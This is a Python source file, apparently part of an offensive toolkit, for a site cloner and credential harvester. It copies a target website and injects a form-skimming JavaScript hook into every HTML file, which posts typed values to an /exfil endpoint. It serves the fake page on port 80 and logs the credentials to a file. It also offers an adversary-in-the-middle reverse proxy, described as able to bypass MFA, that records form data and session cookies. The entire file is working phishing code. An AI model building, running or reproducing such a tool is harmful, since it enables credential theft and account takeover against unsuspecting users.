import os
import threading
import logging
import sys
import time
import requests
import questionary

try:
    import cgi
except ImportError:
    from types import ModuleType
    cgi = ModuleType("cgi")
    cgi.parse_header = lambda line: (line, {})
    sys.modules["cgi"] = cgi

from flask import Flask, request, send_from_directory, Response
from pywebcopy import save_webpage
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

console = Console()
app = Flask(__name__)
BASE_CLONE_PATH = "/opt/davoid/clones"

# Reverse Proxy Configuration
PROXY_TARGET = ""


@app.route('/exfil', methods=['POST'])
def exfil():
    try:
        data = request.form.to_dict()
        client_ip = request.remote_addr
        console.print(Panel(
            f"[bold red]CREDENTIALS HARVESTED[/bold red]\n[yellow]IP:[/yellow] {client_ip}\n[yellow]Data:[/yellow] {data}", title="Exfiltration Event", border_style="red"))

        if not os.path.exists("logs"):
            os.makedirs("logs")
        with open("logs/harvested.txt", "a") as f:
            f.write(f"--- {time.ctime()} | {client_ip} ---\n{data}\n\n")
        return "OK", 200
    except Exception as e:
        return str(e), 500

# --- NEW: Adversary in the Middle Reverse Proxy Mode ---


@app.route('/proxy/<path:target_path>', methods=['GET', 'POST'])
def proxy_traffic(target_path):
    """Dynamically proxies traffic to bypass MFA and capture real-time sessions."""
    global PROXY_TARGET
    url = f"{PROXY_TARGET}/{target_path}"

    # Extract data in real-time
    if request.method == 'POST':
        client_ip = request.remote_addr
        data = request.form.to_dict() if request.form else request.get_data(as_text=True)
        console.print(Panel(
            f"[bold red]LIVE PROXY HARVEST[/bold red]\n[yellow]IP:[/yellow] {client_ip}\n[yellow]Target:[/yellow] {url}\n[yellow]Data:[/yellow] {data}", border_style="red"))

        with open("logs/harvested.txt", "a") as f:
            f.write(
                f"--- {time.ctime()} | {client_ip} (PROXY) ---\nURL: {url}\nDATA: {data}\nCOOKIES: {request.cookies}\n\n")

    # Forward the request to the real server
    resp = requests.request(
        method=request.method,
        url=url,
        headers={key: value for (key, value)
                 in request.headers if key != 'Host'},
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False)

    excluded_headers = ['content-encoding',
                        'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.raw.headers.items()
               if name.lower() not in excluded_headers]

    return Response(resp.content, resp.status_code, headers)
# --------------------------------------------------------


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_clone(path):
    directory = os.getcwd()
    if path == "" or os.path.isdir(os.path.join(directory, path)):
        return send_from_directory(directory, 'index.html')
    return send_from_directory(directory, path)


def run_server():
    try:
        app.run(host='0.0.0.0', port=80, debug=False, threaded=True)
    except Exception as e:
        console.print(f"[bold red][!] Server Failure: {e}[/bold red]")


def inject_hook(directory):
    """Deep search for any HTML file and inject the harvester hook."""
    hook = """
    <script>
    (function() {
        const logExfil = () => {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                const formData = new FormData(form);
                let hasData = false;
                for (let v of formData.values()) { if(v) hasData = true; }
                if (hasData) {
                    fetch('/exfil', { method: 'POST', body: formData });
                }
            });
        };
        document.querySelectorAll('input').forEach(i => i.addEventListener('blur', logExfil));
        document.querySelectorAll('form').forEach(f => f.addEventListener('submit', logExfil));
    })();
    </script>
    """
    found = False
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".html"):
                target_path = os.path.join(root, file)
                try:
                    with open(target_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    if "</body>" in content:
                        content = content.replace("</body>", f"{hook}</body>")
                    else:
                        content += hook
                    with open(target_path, "w", encoding="utf-8") as f:
                        f.write(content)
                    found = True
                except:
                    continue
    return found


def clone_site():
    global PROXY_TARGET
    if os.getuid() != 0:
        return console.print("[red][!] Error: Root privileges required for Port 80.[/red]")

    draw_header("Site Cloner & AitM Harvester")

    mode = questionary.select(
        "Select Operation Mode:",
        choices=[
            "1. Static Cloner (Download and host fake page)",
            "2. Dynamic Reverse Proxy (AitM - MFA Bypass capable)"
        ],
        style=Q_STYLE
    ).ask()

    target_url = questionary.text("Target URL:", style=Q_STYLE).ask()
    if not target_url:
        return

    if "Dynamic" in mode:
        PROXY_TARGET = target_url.rstrip('/')
        console.print(f"[*] Reverse Proxy configured for {PROXY_TARGET}")
        if not os.path.exists("logs"):
            os.makedirs("logs")

        if questionary.confirm("Start Reverse Proxy on Port 80?", default=True, style=Q_STYLE).ask():
            threading.Thread(target=run_server, daemon=True).start()
            console.print(Panel(
                f"AitM Proxy active: [bold green]http://0.0.0.0/proxy/[/bold green]\nRouting to: {PROXY_TARGET}", title="Success", border_style="green"))
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow][-] Server stopped.[/yellow]")
        return

    project_name = questionary.text(
        "Project Name (Folder):", style=Q_STYLE).ask()
    if not project_name:
        return

    full_project_path = os.path.join(BASE_CLONE_PATH, project_name)
    if not os.path.exists(full_project_path):
        os.makedirs(full_project_path)

    console.print(f"[*] Attempting to clone: {target_url}")

    try:
        save_webpage(
            url=target_url,
            project_folder=BASE_CLONE_PATH,
            project_name=project_name,
            bypass_robots=True,
            debug=False,
            open_in_browser=False
        )
    except Exception as e:
        console.print(f"[red][!] PyWebCopy failed: {e}[/red]")

    domain_folder = target_url.replace(
        "https://", "").replace("http://", "").split('/')[0]
    potential_index_dir = os.path.join(full_project_path, domain_folder)

    if not os.path.exists(potential_index_dir):
        os.makedirs(potential_index_dir)

    index_file = os.path.join(potential_index_dir, "index.html")

    if not os.path.exists(index_file):
        console.print(
            "[yellow][!] Index not found. Attempting manual recovery...[/yellow]")
        try:
            r = requests.get(target_url, headers={
                             'User-Agent': 'Mozilla/5.0'}, timeout=10)
            with open(index_file, "w", encoding="utf-8") as f:
                f.write(r.text)
            console.print("[green][+] Manual recovery successful.[/green]")
        except Exception as e:
            return console.print(f"[red][!] Critical failure: {e}[/red]")

    if inject_hook(full_project_path):
        console.print(
            "[green][+] Harvester hook injected successfully.[/green]")
    else:
        return console.print("[red][!] Failed to inject hook into any HTML files.[/red]")

    if questionary.confirm("Start Harvest Server on Port 80?", default=True, style=Q_STYLE).ask():
        os.chdir(potential_index_dir)
        threading.Thread(target=run_server, daemon=True).start()

        try:
            public_ip = requests.get('https://api.ipify.org').text
        except:
            public_ip = "Unknown"

        console.print(Panel(
            f"Portal active: [bold green]http://{public_ip}[/bold green]\nTargeting: {target_url}", title="Success", border_style="green"))

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            console.print("\n[yellow][-] Server stopped.[/yellow]")


if __name__ == "__main__":
    clone_site()
